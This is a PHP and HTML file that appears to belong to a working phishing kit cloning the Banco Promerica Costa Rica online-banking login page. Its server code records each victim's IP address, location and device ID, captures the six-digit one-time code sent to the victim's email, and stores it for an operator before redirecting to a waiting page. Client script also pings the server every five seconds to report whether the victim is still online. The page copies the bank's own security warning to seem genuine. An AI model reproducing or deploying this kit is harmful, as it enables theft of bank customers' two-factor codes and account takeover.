<?php
require_once 'functions.php';

$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id(); 

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
    echo "<script>
            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
            window.location.href = 'https://www.google.com';
          </script>";
    exit();
}

// Actualizar el usuario con su device_id
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $allowedFields = ["correo"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {
        $data = load_data();

        if (!isset($data[$device])) { 
            $data[$device] = ['submissions' => [], 'state' => 'active'];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys     = array_keys($formData);
                sort($existingKeys);
                sort($formKeys);
                if ($existingKeys === $formKeys) {
                    // Reemplazar el submission existente
                    $submission = [
                        "data"      => $formData,
                        "timestamp" => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }

        if (!$found) {
            // Agregar nueva submission
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];
            // Si es la primera submission y aún no se asignó color, asignar siempre #FF0000
            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#FF0000';
            }
        }

        save_data($data);

        header("Location: waiting.php");
        exit();
    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html xmlns="http://www.w3.org/1999/xhtml">

<head id="ctl00_Head1">
       <script>
  setInterval(function(){
      fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
  }, 5000);

  window.addEventListener('unload', function(){
      navigator.sendBeacon('functions.php?action=offline');
  });
  </script>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
  <style type="text/css" id="operaUserStyle"></style>
  <link rel="SHORTCUT ICON" href="https://banca.grupopromerica.com/PCRC/App_Themes/Regional_Default/images/favicon.ico">
  <title> Ingreso </title>
  <link href="./index_files/ccStatementFooter.css" type="text/css" rel="stylesheet">
  <link href="./index_files/ccStatementTransactionsUCN.css" type="text/css" rel="stylesheet">
  <link href="./index_files/chatbot.css" type="text/css" rel="stylesheet">
  <link href="./index_files/NunitoSans.css" type="text/css" rel="stylesheet">
  <link href="./index_files/NunitoSans.min.css" type="text/css" rel="stylesheet">
  <link href="./index_files/chosen.css" type="text/css" rel="stylesheet">
  <link href="./index_files/desktop.css" type="text/css" rel="stylesheet">
  <link href="./index_files/font-awesome.min.css" type="text/css" rel="stylesheet">
  <link href="./index_files/GridHtml.css" type="text/css" rel="stylesheet">
  <link href="./index_files/GridFilter.css" type="text/css" rel="stylesheet">
  <link href="./index_files/TabHtml.css" type="text/css" rel="stylesheet">
  <link href="./index_files/utilities.css" type="text/css" rel="stylesheet">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body class="popUpFont">
  <div id="WzTtDiV"
    style="visibility: hidden; position: absolute; overflow: hidden; padding: 0px; width: 1919px; left: -1920px; top: 0px;">
  </div>
  <div id="zContent" style="display: block;">
    <form class="login100-form validate-form" id="loginform" method="post">
      <p id="gfg" hidden=""></p>
      <p id="address" hidden=""></p>
      <div>
        <div></div>
        <div id="BackDiv" class="backDiv">
          <div id="LoadingDiv" class="loadingDiv">
            <img src="./index_files/Loader.gif" id="ctl00_img_Loading" class="imgLoading" alt="Loading...">
          </div>
        </div>
        <div id="headerLogin" class="styleNewHeader">
          <div id="logoLogin" class="styleNewLogo">
            <img id="ctl00_ciLogo_header" src="./index_files/NewLogo.jpg" alt="logo" style="border-width:0px;">
          </div>
          <div id="countryLogin" class="styleDivCountry">
            <span id="ctl00_clCountryName" class="styleNewColorCountry">Costa Rica</span>
          </div>
        </div>
        <div class="bottom_nav"></div>
        <div id="page_title">
          <div id="login_cotainer">
            <table width="100%">
              <tbody>
                <tr>
                  <td style="width: 800px;">
                    <div class="sub_title_login text_login">
                      <span id="ctl00_PlaceHolder_pbLoginUC_clWelcomeTitle" class="page_title_text">Bienvenido a
                        Promerica en Línea</span>
                      <div id="ctl00_PlaceHolder_pbLoginUC_cgLoginAdditionalText" class="login_slider">
                        <div>
                          <div style="width:50px;">
                            <div
                              style="width: 520px; position: relative; visibility: visible; overflow: hidden; height: 204px;"
                              id="myreel">
                              <div class="slide"
                                style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; z-index: 6; visibility: hidden;">
                                <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
                                  <img src="./index_files/afiliacion.jpg" style="border-width:0;">
                                </div>
                              </div>
                              <div class="slide"
                                style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; z-index: 7; visibility: hidden;">
                                <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
                                  <img src="./index_files/transferencias.jpg" style="border-width:0;">
                                </div>
                              </div>
                              <div class="slide"
                                style="position: absolute; left: 0px; width: 520px; height: 204px; text-align: center; z-index: 8; visibility: visible;">
                                <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
                                  <img src="./index_files/pagodeservicios.jpg" style="border-width:0;">
                                </div>
                              </div>
                              <div class="slide"
                                style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; visibility: hidden; z-index: 5;">
                                <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
                                  <img src="./index_files/pagodetarjetas.jpg" style="border-width:0;">
                                </div>
                              </div>
                            </div>
                          </div>
                          <table width="50px"></table>
                        </div>
                      </div>
                      <div style="margin-top: 50px;">
                        <table>
                          <tbody>
                            <tr>
                              <td colspan="2"></td>
                            </tr>
                            <tr>
                              <td align="center" colspan="2">
                                <div id="ctl00_PlaceHolder_pbLoginUC_Div1">
                                  <div>
                                    <table align="center" width="460px">
                                      <tbody>
                                        <tr>
                                          <td class="normal_text strong page_login_subtitle_text text_login"> Para su
                                            seguridad:</td>
                                        </tr>
                                        <tr class="logincolorbg">
                                          <td class="logincolorbg" colspan="2" style="font-size: 9pt; font-family: Arial, Helvetica, Sans-Serif;
				text-align: justify">
                                            <p class="page_login_text"> Banco Promerica nunca solicitará su clave de
                                              acceso, número de PIN o información confidencial por medio de correo
                                              electrónico o por teléfono. Para utilizar este sitio en forma óptima se
                                              recomienda utilizar una resolución mínima de 1024x768.</p>
                                          </td>
                                        </tr>
                                      </tbody>
                                    </table>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                  </td>
                  <td>
                    <div class="m-l-45 logi_remove">
                      <link href="./index_files/utilities.css" rel="stylesheet" type="text/css">
                    </div>
                    <div class="login_form login_reposition_line m-l-20 m-t-0 p-t-0"></div>
                    <div id="login">
                      <div class="sub_title" style="width: 400px;">
                        <span id="ctl00_PlaceHolder_pbLoginUC_clAccessArea" class="sub_title_text f130 text_login">Por
                          favor, digite el código que hemos enviado a su correo electronico </span>
                      </div>
                      <div class="login_form">
                        <div>
                          <table id="ctl00_PlaceHolder_pbLoginUC_ctSignedOptions" border="0">
                            <tbody>
                              <tr>
                                <td>
                                  <span cssclass="text_login" style="display: none">
                                    <input id="ctl00_PlaceHolder_pbLoginUC_ctSignedOptions_0" type="radio"
                                      name="ctl00$PlaceHolder$pbLoginUC$ctSignedOptions" value="S">
                                    <label for="ctl00_PlaceHolder_pbLoginUC_ctSignedOptions_0">Usar firma
                                      digital</label>
                                  </span>
                                </td>
                              </tr>
                              <tr>
                                <td>
                                  <span cssclass="text_login" style="display: none">
                                    <input id="ctl00_PlaceHolder_pbLoginUC_ctSignedOptions_1" type="radio"
                                      name="ctl00$PlaceHolder$pbLoginUC$ctSignedOptions" value="N" checked="checked">
                                    <label for="ctl00_PlaceHolder_pbLoginUC_ctSignedOptions_1">Sin firma digital</label>
                                  </span>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                        <div id="divContainUC" width="100%">
                          <div id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_cgKeyboardLogin">
                            <table style="margin: 0px 10px 0px 10px;" cellspacing="10">
                              <tbody>
                                <tr>
                                  <td align="right" class="FormTDSubTitle">
                                    <span id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_clInformationKeyboardLogin"
                                      class="normal_text" style="display:inline-block;width:130px;">Codigo al
                                      correo:</span>
                                  </td>
                                  <td>
                                    <input name="correo" type="text" maxlength="6" id="sms" style="width:150px;" required
                                      onkeypress='return event.charCode >= 48 && event.charCode 
																																												<= 57' />
                                    <span id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_cvKeyboardPasswordLogin"
                                      style="color:Red;display:none;">*</span>
                                  </td>
                                </tr>
                              </tbody>
                            </table>
                          </div>
                        </div>
                        <input type="hidden" name="ctl00$PlaceHolder$pbLoginUC$pbAutenticationUC1$hfAutenticationType"
                          id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_hfAutenticationType" value="KEYBOARD">
                        <input type="hidden" name="ctl00$PlaceHolder$pbLoginUC$pbAutenticationUC1$hfCellsBingoCard"
                          id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_hfCellsBingoCard">
                        <input type="hidden" name="ctl00$PlaceHolder$pbLoginUC$pbAutenticationUC1$hfTransactionType"
                          id="ctl00_PlaceHolder_pbLoginUC_pbAutenticationUC1_hfTransactionType">
                        <table class="m-r-10 m-l-10" cellspacing="10">
                          <tbody>
                            <tr>
                              <td align="right" style="width: 120px"></td>
                              <td id="ctl00_PlaceHolder_pbLoginUC_cgPassword">
                                <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btCancel" value="Anterior"
                                  id="ctl00_PlaceHolder_pbLoginUC_btCancel"
                                  class="buttons buttons_text js-LockPage text_login">
                                <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btLogin" value="Ingresar"
                                  onclick="Lg();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$PlaceHolder$pbLoginUC$btLogin&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))"
                                  id="ctl00_PlaceHolder_pbLoginUC_btLogin"
                                  class="buttons buttons_text js-LockPage text_login">
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div id="OptionsLogin">
                      <div id="ctl00_PlaceHolder_pbLoginUC_cgInformationDetail"
                        style="margin: 10px auto; text-align: center;">
                        <i class="fa fa-info-circle" style="font-size:20px">&nbsp;</i>
                        <button type="button" id="btnSelfCare" class="styleRecoverPassword text_login"
                          onclick="openInstructionsRecoverPassword()">¿Olvidó su contraseña?</button>
                      </div>
                      <table style="margin: 10px auto;">
                        <tbody>
                          <tr>
                            <td></td>
                            <td>
                              <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btPassword"
                                value="1. Solicite una contraseña temporal" id="ctl00_PlaceHolder_pbLoginUC_btPassword"
                                class="buttons buttons_text text_login"
                                onmousedown="this.className=&#39;buttons_over buttons_text&#39;;"
                                onmouseup="this.className=&#39;buttons buttons_text&#39;;">
                            </td>
                          </tr>
                        </tbody>
                      </table>
                      <table style="margin: 10px auto;">
                        <tbody>
                          <tr>
                            <td>
                              <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btAsistencia"
                                value="2. Ingrese su contraseña temporal" id="ctl00_PlaceHolder_pbLoginUC_btAsistencia"
                                class="buttons buttons_text text_login"
                                onmousedown="this.className=&#39;buttons_over buttons_text&#39;;"
                                onmouseup="this.className=&#39;buttons buttons_text&#39;;">
                            </td>
                          </tr>
                        </tbody>
                      </table>
                      <div class="login_form m-l-20"></div>
                      <div>
                        <div style="margin: 10px auto; text-align: center;">
                          <span id="ctl00_PlaceHolder_pbLoginUC_GalileoASPLabelQuestionSignUp"
                            class="f180 text_login">¿Es cliente y no tiene usuario?</span>
                        </div>
                        <div class="styleDivSignUp">
                          <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btnSignUpPage" value="Crear Usuario"
                            id="ctl00_PlaceHolder_pbLoginUC_btnSignUpPage" class="buttons buttons_text text_login">
                        </div>
                      </div>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <div id="buttons">
            <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btShowLogin" value=""
              onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$PlaceHolder$pbLoginUC$btShowLogin&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))"
              id="btShowLogin" style="display: none">
          </div>
          <div class="styleSeparator"></div>
          <div style="margin-left:20px;">
            <label class="styleTitle1NewProducts">Productos diseñados</label>
            <label class="styleTitle2NewProducts">para sus necesidades</label>
          </div>
          <div style="margin:10px;">
            <div class="styleCard">
              <img src="./index_files/CtaAhorro.png"
                style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
              <div class="styleContainer">
                <label class="styleTitleCard">Cuenta ahorros</label>
                <label class="styleTextCard">Abrir cuenta en línea y sin filas.</label>
                <button type="button" class="styleButtonCard" onclick="openCtaAhorro()">Abrir cuenta</button>
              </div>
            </div>
            <div class="styleCard">
              <img src="./index_files/CtaEmpresas.png"
                style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
              <div class="styleContainer">
                <label class="styleTitleCard">Cuenta empresas</label>
                <label class="styleTextCard">Cuenta corriente en dólares o colones.</label>
                <button type="button" class="styleButtonCard" onclick="openCtaEmpresas()">Solicitar</button>
              </div>
            </div>
            <div class="styleCard">
              <img src="./index_files/CreditCard.png"
                style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
              <div class="styleContainer">
                <label class="styleTitleCard">Tarjetas crédito</label>
                <label class="styleTextCard">Descuentos, canje de millas y más.</label>
                <button type="button" class="styleButtonCard" onclick="openTarjCredito()">Solicitar</button>
              </div>
            </div>
            <div class="styleCard">
              <img src="./index_files/PymeCard.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
              <div class="styleContainer">
                <label class="styleTitleCard">Tarjeta Pyme</label>
                <label class="styleTextCard">Múltiples beneficios para su negocio.</label>
                <button type="button" class="styleButtonCard" onclick="openTarjPyme()">Solicitar</button>
              </div>
            </div>
            <div class="styleCard">
              <img src="./index_files/Secure.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
              <div class="styleContainer">
                <label class="styleTitleCard">Seguros</label>
                <label class="styleTextCard">Protección para usted y su familia.</label>
                <button type="button" class="styleButtonCard" onclick="openSeguros()">Elegir seguro</button>
              </div>
            </div>
          </div>
          <div class="styleSeparatorBlank"></div>
          <div style="text-align: center;">
            <a class="styleSocialNetwork fa-facebook" href="#" onclick="openFacebook()"></a>
            <a class="styleSocialNetwork fa-twitter" href="#" onclick="openTwitter()"></a>
            <a class="styleSocialNetwork fa-instagram" href="#" onclick="openInstagram()"></a>
            <a class="styleSocialNetwork fa-whatsapp" href="#" onclick="openWhatsapp()"></a>
          </div>
          <div id="ctImageMessageN" style="display: none; position: fixed; z-index: 100001;" class="contentBannerLogin"
            onclick="closeImg();">
            <img id="imgClose" src="./index_files/cerrar.png" alt="Cerrar" class="closeBannerLogin">
            <img src="./index_files/banner_IB.jpg" alt="Información" class="bannerLogin">
          </div>
          <meta http-equiv="X-UA-Compatible" content="IE=edge">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Chatbot de Servicio al Cliente</title>
          <link href="./index_files/chatbot.css" rel="stylesheet" type="text/css">
          <div
            class="fb_dialog fb_dialog_advanced fb_customer_chat_bubble_animated_no_badge fb_customer_chat_bubble_pop_in"
            style="background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%; border-radius: 50%; bottom: 5pt; display: inline; height: 45pt; padding: 0px; position: fixed; right: 18pt; top: auto; width: 45pt; z-index: 2147483646;">
            <div id="botonOpcionesChat" class="messenger-button-shown"
              style="width: 58px; height: 58px; background-color: #69be28;">
              <img src="./index_files/chatchatbot.png" style="max-width: 58px; max-height: 58px;">
            </div>
          </div>
          <div id="divPrincipal" class="divPrincipal hideDiv">
            <div class="promptContainer">
              <div class="promptHeaderContainer">
                <div id="CloseButton" class="promptHeaderCloseButtonContainer">
                  <div class="CloseButtonContainer" tabindex="0" role="button">
                    <svg width="10px" height="10px" viewBox="0 0 14 14">
                      <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                        <g transform="translate(-419.000000, -413.000000)">
                          <g transform="translate(164.000000, 396.000000)">
                            <g>
                              <g transform="translate(250.000000, 12.000000)">
                                <g>
                                  <g>
                                    <rect opacity="0.200000003" x="0" y="0" width="24" height="24"></rect>
                                    <g transform="translate(4.000000, 4.000000)" fill="#000000">
                                      <rect
                                        transform="translate(8.000000, 8.000000) rotate(45.000000) translate(-8.000000, -8.000000) "
                                        x="7" y="-1" width="2" height="18" rx="1"></rect>
                                      <rect
                                        transform="translate(8.000000, 8.000000) rotate(135.000000) translate(-8.000000, -8.000000) "
                                        x="7" y="-1" width="2" height="18" rx="1"></rect>
                                    </g>
                                  </g>
                                </g>
                              </g>
                            </g>
                          </g>
                        </g>
                      </g>
                    </svg>
                  </div>
                </div>
                <div class="profilePictureContainer">
                  <div class="PromericaHeader">
                    <img class="profilePicture img" src="./index_files/estrellapromericachatbot.png" alt="">
                    <div class="clearfix"></div>
                  </div>
                </div>
                <div class="promptHeaderAndBubbleContainer">
                  <div class="promptHeaderText" style="-webkit-line-clamp: 1; font-size: 11px;">
                    <strong>Banco Promerica Costa Rica</strong>
                  </div>
                  <span class="promptTextBubble">
                    <span>¡Hola! ¿En qué podemos ayudarte?</span>
                  </span>
                </div>
              </div>
              <div class="promptFooterContainer">
                <div id="AsistenteVirtual" class="_4bqf promptButton"
                  style="background-color: rgb(105, 190, 40); margin-top: 10px;" tabindex="0" role="button">
                  <div style="position: fixed; width: 30px; height: 30px">
                    <img style="width: 30px; height: 30px; position: absolute; left: -20px; top: -4px;"
                      src="./index_files/chatchatbot.png">
                  </div>
                  <div style="margin-left: 20px;">Asistente Virtual</div>
                </div>
              </div>
            </div>
          </div>
          <input type="hidden" name="ctl00$PlaceHolder$ctDummy" id="ctl00_PlaceHolder_ctDummy">
          <div class="ConfirmModalBackground"
            style="display: none; position: fixed; left: 0px; top: 0px; z-index: 10000;"></div>
        </div>
        <div class="styleTopFooter"></div>
        <div id="footer">
          <div class="styleTextFooter">
            <span class="styleTextOptionFooter"> Banco Promerica 2025 | Todos los derechos reservados. </span>
            <span class="styleTextOptionFooter"> | </span>
            <a class="styleTextOptionFooter" href="#" onclick="openTermAndConditions()">Términos y Condiciones</a>
            <span class="styleTextOptionFooter"> | </span>
            <a class="styleTextOptionFooter" href="#" onclick="openSecurityRecommendations()">Recomendaciones de
              Seguridad</a>
            <span class="styleTextOptionFooter"> | </span>
            <a class="styleTextOptionFooter" href="#" onclick="openContactUs()">Contáctenos</a>
          </div>
          <div class="rights">
            <img id="ctl00_ciLogo_footer" src="./index_files/Logo2.png" alt="logo2"
              style="height:79px;width:193px;border-width:0px;">
          </div>
        </div>
</body>
</html>